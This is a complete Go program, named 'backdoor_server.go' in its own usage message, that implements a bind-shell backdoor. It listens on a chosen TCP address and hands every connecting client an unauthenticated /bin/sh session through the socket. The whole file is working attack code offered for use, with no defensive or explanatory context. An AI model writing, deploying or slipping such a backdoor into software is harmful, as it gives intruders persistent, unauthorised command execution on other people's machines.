/**
 * Created by lock
 */
package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

func main() {
	var addr string
	if len(os.Args) != 2 {
		fmt.Println("example: go run backdoor_server.go x.x.x.x:port")
		os.Exit(0)
	}
	addr = os.Args[1]
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatal("Error connecting. ", err)
	}
	fmt.Println("backdoor server running ……")
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("accepting connection err: ", err)
		}
		go handleConnection(conn)
	}

}

func handleConnection(conn net.Conn) {
	var shell = `/bin/sh`
	_, _ = conn.Write([]byte("backdoor server,exec cmd in bind shell\n"))
	command := exec.Command(shell)
	command.Env = os.Environ()
	command.Stdin = conn
	command.Stdout = conn
	command.Stderr = conn
	_ = command.Run()
}
